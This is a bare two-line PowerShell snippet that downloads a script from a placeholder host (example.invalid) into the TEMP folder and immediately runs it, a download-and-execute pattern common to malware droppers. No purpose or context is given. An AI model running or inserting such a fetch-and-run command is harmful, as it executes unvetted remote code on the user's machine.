Invoke-WebRequest -Uri https://example.invalid/x.ps1 -OutFile $env:TEMP\y.ps1
& $env:TEMP\y.ps1
